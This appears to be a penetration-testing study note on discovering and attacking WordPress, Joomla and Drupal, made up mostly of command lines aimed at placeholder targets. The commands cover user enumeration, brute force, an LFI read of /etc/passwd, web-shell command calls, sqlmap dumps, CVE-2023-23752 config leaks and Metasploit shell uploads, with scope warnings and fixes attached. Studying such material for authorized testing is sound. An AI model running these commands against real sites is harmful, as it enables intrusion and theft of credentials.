# Attacking Common Applications

> Status: 🟨 In progress
> Date started: 2026-10-26
> Date finished: 

## 1. Goal
Enumerate and attack common off-the-shelf applications (CMSs, dev tools, etc.). Starting with WordPress.

## WordPress — discovery & enumeration (reference)
Target placeholder: `<URL>` (module example used `blog.inlanefreight.local`).

### Identify WordPress
```bash
curl -s <URL>/robots.txt                      # disallowed paths often reveal wp-admin/wp-content
curl -s <URL>/wp-admin/                        # redirect behaviour
curl -s <URL>/wp-content/plugins/              # plugin dir
curl -s <URL>/wp-content/themes/               # theme dir
```

### Version & theme
```bash
curl -s <URL> | grep -i "wordpress"            # meta generator / version hints
curl -s <URL>/wp-content/themes/<theme>/style.css
curl -s <URL>/wp-content/themes/<theme>/readme.txt
```

### Plugins (look for known-vuln versions)
```bash
curl -s <URL> | grep -i "plugins"
curl -s <URL>/wp-content/plugins/<plugin>/readme.txt   # version info
```

### User enumeration (manual)
Compare login responses for valid vs invalid users:
```bash
curl -s -I <URL>/wp-login.php -d "log=admin&pwd=invalid"
curl -s -I <URL>/wp-login.php -d "log=invalid&pwd=invalid"
```

### WPScan (automated)
```bash
sudo gem install wpscan
sudo wpscan --url <URL> --enumerate --api-token <TOKEN>
sudo wpscan --url <URL> --enumerate u,p,t      # users, plugins, themes
sudo wpscan --url <URL> --proxy 127.0.0.1:8080 # route through Burp
# brute force — in-scope + approved only:
sudo wpscan --url <URL> --passwords /usr/share/wordlists/rockyou.txt --usernames admin,john
```

### XML-RPC
```bash
curl -i <URL>/xmlrpc.php
curl -X POST -d '<methodCall><methodName>system.listMethods</methodName></methodCall>' <URL>/xmlrpc.php
```
`system.multicall` can amplify brute-force; disabling/limiting xmlrpc.php is the fix.

### Extra checks
```bash
curl -s <URL>/robots.txt | grep Disallow
curl -s <URL>/wp-config.php                     # should NOT be readable
curl -s <URL> | grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*"   # endpoints/keys in source
curl -s <URL>/wp-content/uploads/               # open directory listing?
```

> Brute-force and credential attacks are intrusive — scope + approval only. `wp-config.php` being readable = critical finding (DB creds).

## WordPress — attacking (reference)
Target placeholder `<URL>`, attacker IP `<LHOST>`. All of this is intrusive — authenticated/exploitation actions need scope + approval.

### Authenticated code exec via theme editor
With admin access, an editable theme PHP file (e.g. `404.php`) can be made to run commands — classic admin-to-RCE path. Fix: disable the file editor (`DISALLOW_FILE_EDIT`).
```bash
curl "<URL>/wp-content/themes/<theme>/404.php?0=id"   # after injecting a cmd param into the file
```

### Metasploit admin shell upload (needs valid admin creds)
```text
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS <IP>        # set VHOST <URL> if vhost-based
set USERNAME <user>    # set PASSWORD <pass>
set LHOST <LHOST>
run
```

### Known plugin vulns (version-dependent)
```bash
# mail-masta LFI
curl -s "<URL>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
# wpDiscuz unauthenticated RCE (CVE-2020-24186) — public PoC uploads a shell, then:
curl -s "<URL>/wp-content/uploads/<year>/<month>/<uploaded>.php?cmd=id"
```
Always map plugin + version from enum, then check Exploit-DB / searchsploit for a matching PoC.

### User enumeration via REST API
```bash
curl -s <URL>/wp-json/wp/v2/users      # often leaks usernames even when login is hardened
```

### XML-RPC brute force
`system.multicall` lets many credential guesses ride in one request, amplifying brute force. Public scripts automate it against `xmlrpc.php`. Fix: disable or restrict xmlrpc.php.

### wp-config.php exposure
```bash
curl -s <URL>/wp-config.php            # readable = DB creds exposed = critical
```

### Web shell obfuscation (concept, for recognition & reporting)
Attackers rarely drop a plaintext shell. A common pattern wraps the payload in `base64_decode()` fed to `eval()`, so the file looks like a harmless blob but decodes at runtime to a command-executing one-liner. Why it matters for me:
- **Detecting it:** grep uploaded/content dirs for `eval(`, `base64_decode(`, `assert(`, `system(`, `gzinflate(` in `.php` files; flag recently modified files in `wp-content/uploads/`.
- **Reporting it:** note the obfuscation as an IOC and recommend file-integrity monitoring + blocking PHP execution in upload dirs.
I don't store working shell payloads in this repo.

## Joomla — discovery, enum & attacking (reference)
Target placeholder `<URL>`.

### Identify Joomla
```bash
curl -s <URL>/ | grep -i joomla
curl -s <URL>/robots.txt
curl -s <URL>/README.txt                                       # version
curl -s <URL>/administrator/manifests/files/joomla.xml         # detailed version
curl -s <URL>/plugins/system/cache/cache.xml                   # approx version
curl -I <URL>/favicon.ico                                      # default favicon
```
Fingerprint from several sources (README + joomla.xml + cache.xml) for an accurate version — it drives which exploits apply.

### Version via headers / changelog
```bash
curl -I <URL>/ | grep "X-Content-Encoded-By"
curl -s <URL>/CHANGELOG.php
```

### Automated scanners
```bash
droopescan scan joomla --url <URL>/
python2.7 joomlascan.py -u <URL>/
```

### Login brute force (scope + approval only)
```bash
python3 joomla-brute.py -u <URL> -w <wordlist> -usr admin
```

### Extension enumeration (common vuln source)
```bash
curl -s <URL>/components/
curl -s <URL>/modules/
curl -s <URL>/plugins/
curl -s <URL>/templates/
curl -s <URL>/media/
```

### Config / backup exposure
```bash
curl -s <URL>/configuration.php        # sensitive: DB creds; also .bak
curl -s <URL>/configuration.php.bak
curl -s <URL>/backup.zip
curl -s <URL>/joomla.sql
```

### REST API / user enum
```bash
curl -s <URL>/api/index.php/v1/users
curl -X POST -d "username=admin" "<URL>/index.php?option=com_users&view=reset"
```

### Directory / file discovery
```bash
dirb <URL> /usr/share/wordlists/dirb/common.txt
```

### Known CVEs
```bash
# SQLi CVE-2017-8917
sqlmap -u "<URL>/index.php?option=com_content&id=1" --dbs --batch
# CVE-2023-23752 — unauth info disclosure (leaks config incl. DB creds)
curl -X GET "<URL>/api/index.php/v1/config/application?public=true"
```

### Log checks
```bash
curl -s <URL>/logs/error.php
curl -s <URL>/logs/debug.log
```

> `configuration.php` exposure and CVE-2023-23752 both leak DB credentials — critical findings. Brute-force and SQLi are intrusive: scope + approval only.

## Joomla — attacking (reference)
Intrusive — scope + approval. Target `<URL>`, attacker `<LHOST>`.

### Authenticated template RCE
Log in to `/administrator`, edit a template PHP file (e.g. `error.php`) to run commands via a non-standard param, then clean up.
```bash
curl -s "<URL>/templates/<template>/error.php?<rand>=id"
```
Fix: lock down template editing, restrict admin panel access.

### CVE-2019-10945 — core directory traversal + file deletion
```bash
python2.7 joomla_dir_trav.py --url "<URL>/administrator/" --username admin --password admin --dir /
```
Can read/list sensitive files like `configuration.php`.

### Config exposure
```bash
curl -s <URL>/configuration.php        # DB creds if readable
```

### Extension exploitation
Enumerate extensions → research the specific version → craft the exploit against the component path. Extensions are the most common Joomla attack vector.

### Metasploit
```text
search joomla
use exploit/unix/webapp/joomla_<module>
set RHOSTS <IP> ; set TARGETURI /administrator/
set USERNAME admin ; set PASSWORD <pass>
set LHOST <LHOST> ; run
```

### SQLi → DB dump (sqlmap workflow)
```bash
sqlmap -u "<URL>/index.php?id=1" --dbs --batch
sqlmap -u "<URL>/index.php?id=1" -D <db> --tables --batch
sqlmap -u "<URL>/index.php?id=1" -D <db> -T <table> --columns --batch
sqlmap -u "<URL>/index.php?id=1" -D <db> -T <table> -C <cols> --dump --batch
```

### REST API / XSS / CLI
```bash
curl -s <URL>/api/index.php/v1/users                      # enum/modify if enabled
curl "<URL>/index.php?param=<script>alert(1)</script>"    # reflected XSS test
joomla user:list                                          # if shell access
```

### Post-exploitation
Generic, not Joomla-specific — see the dedicated modules:
- Privesc enum: `linpeas.sh` (Linux, module 25) / `winpeas.exe` (Windows, module 26)
- Pivoting (chisel, sshuttle): module 12 → `cheatsheets/pivoting.md`

### Web shells
Obfuscated shell generation/detection is covered once in the WordPress section above (I don't store working payloads). Same technique applies here.

## Drupal — discovery & enumeration (reference)
Target `<URL>`. Drupal structure: `/modules/`, `/themes/`, `/sites/`, node-based URLs (`/node/1`).

### Identify & version
```bash
curl -s <URL> | grep -i drupal                         # HTML metadata
curl -s <URL>/robots.txt                               # disallows + node refs
curl -s <URL>/CHANGELOG.txt                            # version (often blocked)
curl -s <URL>/rss.xml | grep generator                # generator metadata
curl -s <URL>/core/assets/vendor/jquery/jquery.min.js | grep -i drupal
droopescan scan drupal -u <URL>                        # automated version + modules/themes
# if DB access gained:  SELECT version FROM system;
```

### Modules & themes (find exact versions in .info.yml)
```bash
curl -s <URL>/modules/
curl -s <URL>/modules/<module>/<file>.info.yml
curl -s <URL>/themes/
curl -s <URL>/themes/<theme>/<file>.info.yml
```

### Config / backups / debug exposure
```bash
curl -s <URL>/sites/default/settings.php               # DB creds if readable
curl -s <URL>/sites/default/files/backup.sql           # exposed DB backup
curl -s <URL>/phpinfo.php                               # debug left enabled
```

### Users / content / APIs
```bash
curl -s <URL>/?q=user                                  # public profiles
curl -s <URL>/user/1                                   # default admin enum
curl -s <URL>/rest/user/login_status?_format=json      # REST API if enabled
curl -s <URL>/node/2                                   # sequential node IDs
curl -s <URL>/node.json                                # JSON API enabled?
curl -X POST <URL>/graphql -H "Content-Type: application/json" --data '{"query":"{__schema{types{name}}}"}'   # GraphQL schema
```

### Admin panel
```bash
curl -s <URL>/user/login
curl -s <URL>/admin
```

> `settings.php` and exposed `backup.sql` leak DB creds — critical. Known Drupal RCEs (e.g. Drupalgeddon2 CVE-2018-7600) depend on exact core version, so fingerprint first.

### My notes / lab output
Filled in once I run this on a WordPress / Joomla / Drupal target.

## 2. Setup
- Attack box: (Pwnbox / Kali VM)
- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)

## 3. Commands I used
Each block says which machine it ran on.

```bash
# [ATTACK BOX]

```

```bash
# [TARGET]

```

## 4. Confirmed (what worked)
- 

## 5. Tried, didn't work (and why)
- 

## 6. Open questions / revisit
- 

## 7. Cheat sheet lines
Copied into `cheatsheets/`:
- 
